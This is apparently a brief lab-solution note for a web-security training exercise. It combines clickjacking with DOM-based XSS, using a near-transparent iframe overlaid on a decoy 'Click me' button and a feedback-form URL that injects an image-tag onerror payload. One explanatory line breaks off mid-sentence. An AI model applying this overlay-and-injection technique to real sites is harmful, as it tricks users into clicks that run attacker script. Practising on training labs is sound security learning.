Exploiting clickjacking vulnerability to trigger DOM-based XSS:

    -This is combined attack of clickjacking and DOM-based XSS
    -We need to fill the form in url and in name parameter we use image tag to call print() function to 
    -<style>
        #frame{
            position:absolute;
            width:1000;
            height: 700;
            opacity:0.1;
            z-index: 2;
        }
        #Div{
            position:absolute;
            top:620;
            left:62;
            z-index: 1;
        }
    </style>
    <div id="Div">Click me</div>
    <iframe src="https://0a3d00b4035f5d45811d750400b700a0.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult" id="frame"></iframe>
